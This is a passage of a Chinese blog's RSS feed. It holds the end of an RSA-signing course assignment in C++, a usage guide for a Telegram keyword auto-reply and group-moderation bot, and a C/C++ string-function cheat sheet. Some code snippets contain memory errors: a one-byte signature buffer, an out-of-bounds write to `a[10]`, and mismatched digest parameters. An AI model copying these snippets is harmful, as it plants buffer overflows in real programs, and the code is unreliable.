    <span class="n">md5_hash</span><span class="p">(</span><span class="n">str</span><span class="p">,</span> <span class="n">md</span><span class="p">);</span>

    <span class="c1">// then gen rsa pkey and sign the md
</span><span class="c1"></span>    <span class="n">RSA</span><span class="o">*</span> <span class="n">rsa</span> <span class="o">=</span> <span class="n">gen_rsa</span><span class="p">();</span>
    <span class="kt">unsigned</span> <span class="kt">char</span><span class="o">*</span> <span class="n">sig</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">unsigned</span> <span class="kt">char</span><span class="p">;</span>
    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">siglen</span><span class="p">;</span>
    <span class="n">RSA_sign</span><span class="p">(</span><span class="n">NID_sha1</span><span class="p">,</span> <span class="n">md</span><span class="p">,</span> <span class="n">MD5_DIGEST_LENGTH</span><span class="p">,</span> <span class="n">sig</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">siglen</span><span class="p">,</span> <span class="n">rsa</span><span class="p">);</span>

    <span class="c1">// final base64(sig)
</span><span class="c1"></span>    <span class="kt">char</span><span class="o">*</span> <span class="n">b64text</span><span class="p">;</span>
    <span class="n">base64_encode</span><span class="p">(</span><span class="n">sig</span><span class="p">,</span> <span class="p">(</span><span class="n">size_t</span><span class="p">)</span><span class="n">siglen</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">b64text</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;%s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">b64text</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><blockquote>
<p>因为是课程作业，就没有对出现的错误情况进行处理，实际使用时需要考虑到</p>
</blockquote>
<h2 id="运行">运行</h2>
<h3 id="运行截图">运行截图</h3>
<p></p>
<h3 id="生成的私钥文件">生成的私钥文件</h3>
<p></p>
<h3 id="生成的公钥文件">生成的公钥文件</h3>
<p></p>
]]></description></item><item><title>Telegram关键词自动回复机器人</title><link>https://lgf.im/posts/coding/telegram-keyword-reply-bot/</link><pubDate>Tue, 26 Nov 2019 19:03:35 +0000</pubDate><author>作者</author><guid>https://lgf.im/posts/coding/telegram-keyword-reply-bot/</guid><description><![CDATA[<h2 id="前言">前言</h2>
<p>高中时期了解了telegram，大学期间正式开始使用。自己的频道最多的时候有上万人关注，聊天群组里人数也很多，但是时间久了我发现了一个问题。因为telegram在国内并不常用，新加入的成员往往都是新手，通常会问一些琐碎的、相似的问题，例如：如何汉化tg、+86号码无法私聊别人，等等相关的问题是在不想重复回答，便产生了制作一个关键词回复机器人的想法。</p>
<h2 id="功能">功能</h2>
<p>下面简单说一下机器人实现的一些功能，具体还是推荐你亲身进行体验。</p>
<ul>
<li>首先为了满足最初的需求，机器人需要能够对特定关键词回复特定的文字内容。</li>
<li>为了能够更加灵活的匹配关键词，针对关键词识别增加了正则匹配方式的关键词识别方法，可以让用户能够编写更加灵活的关键词规则。</li>
<li>为了满足更加更多种类的回复内容，回复种类除了文字还增加了照片、动图、视频、文件、表情、Marddown等其他的回复种类，并且允许给图片、文件等添加描述信息。</li>
<li>为了满足部分群组的多样化回复需求，回复方式增加了 多个回复消息混合、多个回复类型混合、回复内容随机选择 等复杂但灵活的规则配置方式。</li>
<li>为了能够实现部分群管功能，回复类型增加了群管操作，包括 消息删除、消息置顶、人员禁言、人员踢出等功能，只需要设置相应的关键词回复规则即可。</li>
<li>除了关键词功能外，我还给机器人增加了群管命令、获取用户id信息、禁言游戏、加群欢迎、退群送别、一键呼叫所有管理员等功能。</li>
</ul>
<p>下面我将演示一些基本的功能配置和使用方法。</p>
<h2 id="使用示例">使用示例</h2>
<p>关键词规则的使用<br>
添加规则使用 /add 关键词===回复内容<br>
删除规则使用 /del 关键词<br>
查看规则在群组里使用 /list</p>
<h3 id="回复文本内容">回复文本内容</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">/add 汉化===tg支持语言包功能，点击【链接】即可修改为中文。
</code></pre></td></tr></table>
</div>
</div><p>添加这条规则之后，机器人就会对每一条包含有“汉化”关键词的消息回复“tg支持语言包功能，点击【链接】即可修改为中文。”这个特定内容。</p>
<p>回复文字支持markdown语法，添加前缀 <code>md::</code> 即可使用</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">/add <span class="nv">testmd</span><span class="o">===</span>md::加粗**bold**
</code></pre></td></tr></table>
</div>
</div><h3 id="回复图片">回复图片</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">/add 关键词===photo::图片链接
</code></pre></td></tr></table>
</div>
</div><p>图片链接需要时互联网上tg服务器可以访问到的图片，可以是tg上公开群组或者频道的图片消息链接或者互联网上任意图片资源链接</p>
<p>例如：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">/add 小白兔===photo::https://img.cdn.com/tupian.jpg

/add 小可爱===photo::https://t.me/peekfun/1000
</code></pre></td></tr></table>
</div>
</div><h3 id="回复动图视频文件">回复动图\视频\文件</h3>
<p>机器人除了回复图片外，还支持回复动图、视频、文件，如果你已经学会了回复图片，那这些种类也没有问题。</p>
<ul>
<li>动图 <code>/add 关键词===gif::动图链接</code></li>
<li>视频 <code>/add 关键词===video::视频链接</code></li>
<li>文件 <code>/add 关键词===file::文件链接</code></li>
</ul>
<p>需要注意的是，各种链接要么是tg上公开群组或者频道的链接（私有群组不行），要么是互联网上的资源链接，注意链接需要与发送的种类对应好。</p>
<h3 id="图片文件添加文字">图片\文件添加文字</h3>
<p>在手动发送图片等的时候我们可以添加描述信息，机器人回复规则也可以。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">为了便于理解，添加了缩进和换行，添加规则的时候不要缩进和换行

/add 关键词===photo::图片链接::描述文字

/add 小白兔===
            photo::https://img.cdn.com/tupian.jpg  ::
            这里是描述文字，例如原来你也喜欢小白兔呀
</code></pre></td></tr></table>
</div>
</div><p>文件的使用也是类似，就不再重复</p>
<blockquote>
<p>注意：图片和文件的介绍文字默认开启markdown语法</p>
</blockquote>
<h3 id="正则表达式进行匹配">正则表达式进行匹配</h3>
<p>现在你已经会使用关键词来回复特定内容了，但是为了更加灵活的回复，而不是令机器人看起来傻乎乎的<br>
事实上机器人聪明与否完全看你设置的关键词规则是否灵活，你需要学习简单的正则表达式并且利用正则来进行匹配。</p>
<p>使用正则匹配非常简单，只需要将原来的关键词替换为 <code>re:正则规则</code> 即可。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">/add re:(如何|怎样).*(激活|使用)===请查看这个说明
</code></pre></td></tr></table>
</div>
</div><p>在这个例子里面，使用了正则表达式进行了匹配，此时用户发送 “有谁知道怎样进行账号的激活吗？”也可以匹配上，这大大提高了规则的灵活性。</p>
<blockquote>
<p>需要说明的是，机器人的所有关键词使用方法均支持正则，你可以随意进行尝试。</p>
</blockquote>
<h3 id="一次回复多条消息">一次回复多条消息</h3>
<p>有些时候一条消息无法满足回复的需求，需要机器人同时返回多个消息，这也是支持的。</p>
<p>你只需要用 || 将多个回复内容间隔开就可以了。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">/add 关键词===回复文字1||回复文字2||回复文字3
</code></pre></td></tr></table>
</div>
</div><p>不同种类的回复内容也可以混合在一起，请随意混搭</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">为了便于理解，添加了缩进和换行，添加规则的时候不要缩进和换行
/add 关键词===
            请欣赏  ||
            photo::图片链接  ||
            video::视频链接  ||
            如果需要更多内容，你可以下载软件  ||
            file::文件链接
</code></pre></td></tr></table>
</div>
</div><h3 id="回复随机消息">回复随机消息</h3>
<p>有一个群组提出了这样一个特定需求，想要从设置好的回复内容中随机回复一个，这也是支持的。</p>
<p>使用方法：<br>
random{回复内容1$$回复内容2$$回复内容3}，使用两个英文的$符号间隔。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">为了便于理解，添加了缩进和换行，添加规则的时候不要缩进和换行
/add 关键词===
            random::{
                一条消息  $$
                photo::PHOTO_URL  $$
                另一条消息
            }
</code></pre></td></tr></table>
</div>
</div><p>在这个关键词规则里，机器人将自动从三条消息中选择一个发出。</p>
<p>你可以结合上面一个使用方法，让规则更加灵活</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">为了便于理解，添加了缩进和换行，添加规则的时候不要缩进和换行
/add 小白兔===
            你也喜欢小白兔呀，送你一张小白兔的照片  ||
            random::{
                photo::照片链接1 $$
                photo::照片链接2 $$
                photo::照片链接3
            }  ||
            如果喜欢可以下载软件获取更多图片  ||
            file::文件的链接
</code></pre></td></tr></table>
</div>
</div><h3 id="自动删除消息">自动删除消息</h3>
<p>大多数时候我们需要屏蔽一些关键词，防止用户讨论相关内容，比如说政治、色情、黑产等内容。<br>
机器人既然可以识别关键词，就可以进行相关消息删除操作，你需要给机器人删除消息的管理员权限。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">/add 日站===delete
</code></pre></td></tr></table>
</div>
</div><p>这样机器人就会将含有 日站 二字的消息自动删除，起到屏蔽的作用，你可以使用正则进行更加灵活的匹配。</p>
<p>直接删除可能不太友好，你可以结合前面的内容进行优化，比如结合多个回复内容进行添加提示语。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">/add 日站===本群禁止讨论黑产相关内容||delete
</code></pre></td></tr></table>
</div>
</div><p>这样的规则机器人就会先回复“本群禁止讨论黑产相关内容”，然后再进行删除。</p>
<blockquote>
<p>注意：delete一定要放在最后，否则回复消息发送不出来。</p>
</blockquote>
<h3 id="自动禁言踢人">自动禁言\踢人</h3>
<p>只删除还不过瘾，有人刷消息？禁言和踢人同样支持。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">禁言
/add <span class="nv">keyword</span><span class="o">===</span>ban
会自动禁言发送keyword的用户 永久

禁言特定时长
/add <span class="nv">keyword</span><span class="o">===</span>ban::3d6h20m36s
会自动禁言发送keyword的用户 3天6个小时20分钟36s
时长信息4个时间单位不必全部写满，时长换算成秒如果低于30s意味着永久禁言，多于1年也是永久禁言

踢人
/add <span class="nv">日站</span><span class="o">===</span>kick
</code></pre></td></tr></table>
</div>
</div><p>你还是可以结合上面的内容进行优化，因为delete、ban、kick也是回复种类之一，所以跟文字、照片、视频、文件等的使用方法相同，也就可以进行组合。</p>
<h3 id="屏蔽特定后缀文件">屏蔽特定后缀文件</h3>
<p>有人发送exe\com\bat等后缀的病毒？不用再去找其他机器人了，使用自定义规则即可完成屏蔽和禁言。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">/add re:(\.exe|\.scr|\.cpl|\.com|\.cmd|\.bat|\.vbs)$===ban
</code></pre></td></tr></table>
</div>
</div><p>这样带有exe\src\cpl\com\cmd\bat\vbs等可执行后缀的文件就会被自动删除，相关发送者就会被禁言。</p>
<blockquote>
<p>关键词功能可以根据每个群组添加的不同的关键词规则实现一些简单的回复或者更加复杂的操作，通过组合等方式来实现相应功能完全看你的规则，所以发挥你的脑洞吧。</p>
</blockquote>
<h3 id="进群欢迎和退群欢送">进群欢迎和退群欢送</h3>
<p>机器人可以设置欢迎和欢送文字</p>
<p>需要使用 <code>/welcome</code> 和 <code>/goodbye</code> 命令分别开启</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">/welcome
开启后，可以设置内容
/setwelcometext 欢迎 <span class="nv">$username</span> 加入 <span class="nv">$groupname</span> 这个大家庭

/goodbye
开启后，可以设置内容
/setgoodbyetext <span class="nv">$username离开了我们群</span>
</code></pre></td></tr></table>
</div>
</div><blockquote>
<p>注意：加群欢迎和退群欢送文字默认开启markdown语法
使用 $userid 自动替换 用户id, $username 自动替换用户名
使用 $groupid 自动替换 群组id， $groupname 自动替换群组名</p>
</blockquote>
<h3 id="回复按钮">回复按钮</h3>
<blockquote>
<p>看样子很多人需要这个功能，就加上了</p>
</blockquote>
<p>示例：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">/add test===button::{&#34;text&#34;: &#34;测试按钮消息，支持_Markdown_&#34;,&#34;buttons&#34;: [[{&#34;text&#34;:&#34;百度&#34;,&#34;url&#34;:&#34;https://baidu.com&#34;},{&#34;text&#34;:&#34;谷歌&#34;,&#34;url&#34;:&#34;https://google.com&#34;},{&#34;text&#34;:&#34;拾取&#34;,&#34;url&#34;:&#34;http://t.me/peekfun&#34;}],[{&#34;text&#34;:&#34;百度&#34;,&#34;url&#34;:&#34;https://baidu.com&#34;},{&#34;text&#34;:&#34;谷歌&#34;,&#34;url&#34;:&#34;https://google.com&#34;}]]}
</code></pre></td></tr></table>
</div>
</div><p>button::后面的json格式如下</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">{
    &#34;text&#34;: &#34;测试按钮消息，支持_Markdown_&#34;,   // 这里是回复的消息内容，支持markdown，群组名替换啥的
    &#34;buttons&#34;: [ // 按钮列表
        // 第一行按钮
        [
            {&#34;text&#34;:&#34;百度&#34;,&#34;url&#34;:&#34;https://baidu.com&#34;},
            {&#34;text&#34;:&#34;谷歌&#34;,&#34;url&#34;:&#34;https://google.com&#34;},
            {&#34;text&#34;:&#34;拾取&#34;,&#34;url&#34;:&#34;http://t.me/peekfun&#34;}
        ],
        // 第二行按钮
        [
            {&#34;text&#34;:&#34;百度&#34;,&#34;url&#34;:&#34;https://baidu.com&#34;},
            {&#34;text&#34;:&#34;谷歌&#34;,&#34;url&#34;:&#34;https://google.com&#34;}
        ]
    ]
}
</code></pre></td></tr></table>
</div>
</div><h2 id="命令列表">命令列表</h2>
<ul>
<li>help - 查看帮助</li>
<li>add - 添加规则</li>
<li>del - 删除规则</li>
<li>list - 列出规则</li>
<li>admin - 呼叫管理员</li>
<li>banme - 禁言小游戏</li>
<li>getid - 查看用户的信息 可回复查看别人</li>
<li>autoreply - 开关自动回复功能</li>
<li>autodelete - 开关自动删除消息功能</li>
<li>replyorder - 开关回复ban/kick命令功能</li>
<li>banmegame - 开关禁言小游戏功能</li>
<li>playorderban - 开关玩命令惩罚功能</li>
<li>banqingzhen - 开关防清真功能</li>
<li>calladmin - 开关呼叫管理员功能</li>
<li>welcome - 开关加群欢迎功能</li>
<li>goodbye - 开关离群送别功能</li>
<li>deletejoinmessage - 开关删除加群消息功能</li>
<li>servicelist - 查看机器人功能列表</li>
<li>deleteallrules - 清空本群所有关键词规则</li>
<li>deleteallmessage - 删除48小时内所有消息</li>
</ul>
<h2 id="开源">开源</h2>
<p>开源地址： <a href="https://github.com/zu1k/tg-keyword-reply-bot">https://github.com/zu1k/tg-keyword-reply-bot</a></p>
<h2 id="赞助">赞助</h2>
<blockquote>
<p>这里要特别感谢 聪聪，是他赞助了服务器费用。<br>
聪聪大佬是tg上 印象笔记群组 的创建者，他的群组和频道是tg上中文交流（不讨论政治、色情、黑产）的一个不错的地方，推荐刚刚开始使用tg的同学加入。<br>
聪聪的群组 @yxbjx<br>
聪聪的频道 @YinxiangBiji_News</p>
</blockquote>
<p>如果你认为这个机器人为你管理群组提供了帮助，那么期待你的赞助，你的赞助可以帮助机器人运行更长时间，同时你的名字也会被记录到机器人开源页。</p>
<h3 id="如何赞助">如何赞助</h3>
<p>一共有两种方式可以给这个机器人提供赞助</p>
<ul>
<li>通过邮箱联系我，然后索要我的赞赏码或者其他收款方式</li>
</ul>
<h2 id="问题反馈">问题反馈</h2>
<p>目前有效的反馈方式是github上的 <a href="https://github.com/zu1k/tg-keyword-reply-bot/issues" target="_blank" rel="noopener noreffer">Issue页面</a> ，目前仅支持闭源版本问题反馈，反馈时请一次性描述清楚，必要时请附加截图，这样有利于更好的解决问题。</p>
<p>如果是增加特定功能就不要反馈了，如有需求可以找我或别人定制特定的机器人。</p>
<h2 id="后续工作">后续工作</h2>
<p>其实我已经退出tg大半年了，已经不太需要机器人了，目前全靠聪聪支持支撑</p>
<p>不过机器人后续开发不会停止，今年比较忙，等我闲下来给机器人做一个大版本更新</p>
<p>后续会将 匹配 和 动作 进行拆分，匹配将支持更加细致和灵活的方式，动作会进行增加，争取支持tg所有的消息类型和群组管理类型</p>
<p>还会增加网页控制后台，可以在网页后台查看群组统计信息，并对群组机器人规则进行设置</p>
]]></description></item><item><title>c/c++字符串处理大集合</title><link>https://lgf.im/posts/coding/c-cpp-string-op/</link><pubDate>Mon, 03 Dec 2018 13:09:49 +0000</pubDate><author>作者</author><guid>https://lgf.im/posts/coding/c-cpp-string-op/</guid><description><![CDATA[<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-cpp" data-lang="cpp"><span class="n">rember</span> <span class="k">this</span>

<span class="nf">strncpy</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">,</span><span class="mi">5</span><span class="p">);</span>
<span class="n">a</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span><span class="o">=</span><span class="sc">&#39;\0&#39;</span><span class="p">;</span>

<span class="kt">char</span> <span class="n">a</span><span class="p">[</span><span class="mi">10</span><span class="p">];</span>
<span class="n">memset</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="sc">&#39;#&#39;</span><span class="p">,</span><span class="k">sizeof</span><span class="p">(</span><span class="n">a</span><span class="p">));</span>
<span class="n">a</span><span class="p">[</span><span class="mi">10</span><span class="p">]</span><span class="o">=</span><span class="sc">&#39;\0&#39;</span><span class="p">;</span>
</code></pre></td></tr></table>
</div>
</div><p>刚开始学C/C++时，一直对字符串处理函数一知半解，这里列举C/C++字符串处理函数，希望对初学者有一定的帮助。</p>
<h1 id="c">C：</h1>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-c" data-lang="c"><span class="kt">char</span> <span class="n">st</span><span class="p">[</span><span class="mi">100</span><span class="p">];</span>
</code></pre></td></tr></table>
</div>
</div><ol>
<li>字符串长度</li>
</ol>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-c" data-lang="c"><span class="n">strlen</span><span class="p">(</span><span class="n">st</span><span class="p">);</span>
</code></pre></td></tr></table>
</div>
</div><ol start="2">
<li>字符串比较</li>
</ol>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-c" data-lang="c"><span class="n">strcmp</span><span class="p">(</span><span class="n">st1</span><span class="p">,</span><span class="n">st2</span><span class="p">);</span>

<span class="c1">//把st1,st2的前n个进行比较。
</span><span class="c1"></span><span class="n">strncmp</span><span class="p">(</span><span class="n">st1</span><span class="p">,</span><span class="n">st2</span><span class="p">,</span><span class="n">n</span><span class="p">);</span>
</code></pre></td></tr></table>
</div>
</div><ol start="3">
<li>附加</li>
</ol>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-c" data-lang="c"><span class="n">strcat</span><span class="p">(</span><span class="n">st1</span><span class="p">,</span><span class="n">st2</span><span class="p">);</span>
<span class="n">strncat</span><span class="p">(</span><span class="n">st1</span><span class="p">,</span><span class="n">st2</span><span class="p">,</span><span class="n">n</span><span class="p">);</span> <span class="c1">//n表示连接上st2的前n个给st1，在最后不要加&#39;\0&#39;。
</span></code></pre></td></tr></table>
</div>
</div><ol start="4">
<li>替换</li>
</ol>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-c" data-lang="c"><span class="n">strcpy</span><span class="p">(</span><span class="n">st1</span><span class="p">,</span><span class="n">st2</span><span class="p">);</span>
<span class="n">strncpy</span><span class="p">(</span><span class="n">st1</span><span class="p">,</span><span class="n">st2</span><span class="p">,</span><span class="n">n</span><span class="p">);</span> <span class="c1">//n表示复制st2的前n个给st1，在最后要加&#39;\0&#39;。
</span></code></pre></td></tr></table>
</div>
</div><ol start="5">
<li>查找</li>
</ol>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-c" data-lang="c"><span class="n">where</span> <span class="o">=</span> <span class="n">strchr</span><span class="p">(</span><span class="n">st</span><span class="p">,</span><span class="n">ch</span><span class="p">)</span> <span class="c1">//ch为要找的字符。
</span><span class="c1"></span><span class="n">where</span> <span class="o">=</span> <span class="n">strspn</span><span class="p">(</span><span class="n">st1</span><span class="p">,</span><span class="n">st2</span><span class="p">);</span> <span class="c1">//查找字符串。
</span><span class="c1"></span><span class="n">where</span> <span class="o">=</span> <span class="n">strstr</span><span class="p">(</span><span class="n">st1</span><span class="p">,</span><span class="n">st2</span><span class="p">);</span>
</code></pre></td></tr></table>
</div>
</div><h1 id="c-1">C++：</h1>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-cpp" data-lang="cpp"><span class="o">&lt;</span><span class="n">string</span><span class="o">&gt;</span>
<span class="n">string</span> <span class="n">str</span><span class="p">;</span>
</code></pre></td></tr></table>
</div>
</div><ol>
<li>字符串长度</li>
</ol>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-cpp" data-lang="cpp"><span class="n">len</span> <span class="o">=</span> <span class="n">str</span><span class="p">.</span><span class="n">length</span><span class="p">();</span>
<span class="n">len</span> <span class="o">=</span> <span class="n">str</span><span class="p">.</span><span class="n">size</span><span class="p">();</span>
</code></pre></td></tr></table>
</div>
</div><ol start="2">
<li>字符串比较
可以直接比较
也可以:</li>
</ol>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-cpp" data-lang="cpp"><span class="n">str1</span><span class="p">.</span><span class="n">compare</span><span class="p">(</span><span class="n">str2</span><span class="p">);</span>
<span class="n">str1</span><span class="p">.</span><span class="n">compare</span><span class="p">(</span><span class="n">pos1</span><span class="p">,</span><span class="n">len1</span><span class="p">,</span><span class="n">str2</span><span class="p">,</span><span class="n">pos2</span><span class="p">,</span><span class="n">len2</span><span class="p">);</span> <span class="c1">//值为负，0 ，正。
</span><span class="c1">//nops 长度到完。
</span></code></pre></td></tr></table>
</div>
</div><ol start="3">
<li>附加
<code>str1 += str2;</code>
或</li>
</ol>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-cpp" data-lang="cpp"><span class="n">str1</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">str2</span><span class="p">);</span>
<span class="n">str1</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">str2</span><span class="p">.</span><span class="n">pos2</span><span class="p">,</span><span class="n">len2</span><span class="p">);</span>
</code></pre></td></tr></table>
</div>
</div><ol start="4">
<li>字符串提取</li>
</ol>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-cpp" data-lang="cpp"><span class="n">str2</span> <span class="o">=</span> <span class="n">str1</span><span class="p">.</span><span class="n">substr</span><span class="p">();</span>
<span class="n">str2</span> <span class="o">=</span> <span class="n">str1</span><span class="p">.</span><span class="n">substr</span><span class="p">(</span><span class="n">pos1</span><span class="p">);</span>
<span class="n">str2</span> <span class="o">=</span> <span class="n">str1</span><span class="p">.</span><span class="n">substr</span><span class="p">(</span><span class="n">pos1</span><span class="p">,</span><span class="n">len1</span><span class="p">);</span>
<span class="n">string</span> <span class="n">a</span><span class="o">=</span><span class="n">s</span><span class="p">.</span><span class="n">substr</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">4</span><span class="p">);</span> <span class="c1">//获得字符串s中 从第0位开始的长度为4的字符串
</span></code></pre></td></tr></table>
</div>
</div><ol start="5">
<li>字符串搜索</li>
</ol>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-cpp" data-lang="cpp"><span class="n">where</span> <span class="o">=</span> <span class="n">str1</span><span class="p">.</span><span class="n">find</span><span class="p">(</span><span class="n">str2</span><span class="p">);</span>
